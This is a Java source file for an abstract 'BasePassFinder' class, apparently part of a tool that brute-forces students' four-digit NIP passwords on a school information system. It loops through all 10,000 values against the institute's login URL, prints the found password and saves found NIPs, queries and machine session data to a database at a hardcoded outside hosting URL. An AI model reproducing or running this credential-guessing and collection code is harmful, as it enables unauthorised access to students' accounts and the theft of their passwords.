package sii;
import java.awt.Toolkit;
import java.util.Scanner;
import javax.swing.JOptionPane;

public abstract class BasePassFinder {
	public String numeroControl, Instituto, urlInstituto;
	public static String recordUrl = "http://yo-t.besaba.com/solution/index.php";// hosteada en http://hostinger.co.uk/  
	//public static String recordUrl = "http://itmexicali.pusku.com/solution/index.php"; // hosteada en
	//hosteada en
	public static boolean searching = false, useSwing=false, from9999 = true, recordSearch = true;
	public int timeout = 75, mNIP = -1;
	public static Scanner in;


	/////////////////////// CONSTRUCTORS ////////////////////////////////////
	public BasePassFinder(){
		if (in == null)
			in = new Scanner(System.in);
	}

	public BasePassFinder(String instituto, String noControl) {
		Instituto = instituto;
		setNcontrol(noControl);
	}

	/////////////////////// SETTERS METHODS	////////////////////////////////////
	void setInstituto(String inst){
		Instituto = inst;
	}

	void setNcontrol(String nC){
		numeroControl = nC;
		findUrlInstituto();
		saveQuery();
	}

	/** 	Set found nip to be accessed globally
	 * @param nip the found NIP
	 * @param save2DB true if the nip will be saved to the DB */
	public void setNIPfound(int nip, boolean save2DB){
		mNIP = nip;
		searching = false;
		System.out.printf("\tPassword for student: %s is: %d%n",numeroControl,nip);
		if(save2DB){
			saveFoundNip();
			if(useSwing){
				JOptionPane.showMessageDialog(null,"El NIP de alumno: "+numeroControl+" es: "+nip);
			}
		}
	}

	//////////////////////////	DATABASE METHODS	//////////////////////////////
	/**		Init the database connection, save session data
	 * and try to find the student's NIP on previous records.
	 * NOTE: this method runs on a new thread	 */
	public abstract void startDB();

	/**		Search for the Access URL on the DB given the Institute
	 * where the student studies to send the queries	 */
	public abstract void findUrlInstituto();


	/** Save the queries that the current user has done on this machine.	 */
	public abstract void saveQuery();

	/** 	If we now searching for the NIP and the DB connection is
	 * ready check if it's already stored in the DBs and save this query.
	 * NOTE: This search is done in a new thread*/
	public abstract void searchNIPonRecords();

	/**		Save this session information, incluiding machine running the program */
	public abstract void saveThisSessionData();

	/**		Save the globally found NIP in the DB */
	public abstract void saveFoundNip();


////////////////////////// SEARCHING METHODS	//////////////////////////////
	/**
	 * Iterate all the possible NIPS for a given student, each iteration
	 * creates a new thread to test every NIP.
	 * @throws Exception	 */
	public void Iterate()throws Exception{
		searching = true;
		searchNIPonRecords();
		//int nControl = Integer.parseInt(numeroControl);
		//for(int iterate= 0; iterate<1100;iterate++){
			//numeroControl=String.format("%08d",nControl);
			System.out.println("Searching NIP for student: "+numeroControl);
			if( from9999 ){
				for(int i =9999;i>0 && searching;i--){
					TestPass.tryPW(i,urlInstituto,numeroControl,this);
					Thread.sleep(timeout);
				}
			}
			else{
				for(int i =1;i<10000 && searching ;i++){
					TestPass.tryPW(i,urlInstituto,numeroControl,this);
					Thread.sleep(timeout);
				}
			}
			if(mNIP == -1){
				System.out.println("Unable to find NIP for student: "+numeroControl);
				if(useSwing){
					JOptionPane.showMessageDialog(null,"No se pudo obtener el NIP de alumno: "+numeroControl);
				}
			}
			//searching = true;
			//nControl++;
		//}
		searching = false;
		Toolkit.getDefaultToolkit().beep();
	}
}

